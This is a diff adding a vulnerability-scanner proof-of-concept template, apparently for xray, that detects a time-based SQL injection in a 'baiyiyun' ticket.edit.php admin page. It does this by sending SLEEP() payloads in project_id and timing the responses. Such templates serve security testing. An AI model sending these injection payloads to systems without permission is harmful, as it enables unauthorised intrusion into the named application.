@@ -1,0 +1,25 @@
+name: poc-yaml-baiyiyun-ticket.edit.php-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(2)))OKTO)
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /adminx/ticket.edit.php?project_id=1%20AND%20(SELECT%206941%20FROM%20(SELECT(SLEEP(4)))OKTO)
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487776&idx=1&sn=5ec946829ea54791d080b38cbdf4a635&chksm=c267a413f5102d0558a84e3c37b9e033c851aeaf9a02fafdbc73b501887a2506bb232884973d&token=65579130&lang=zh_CN#rd
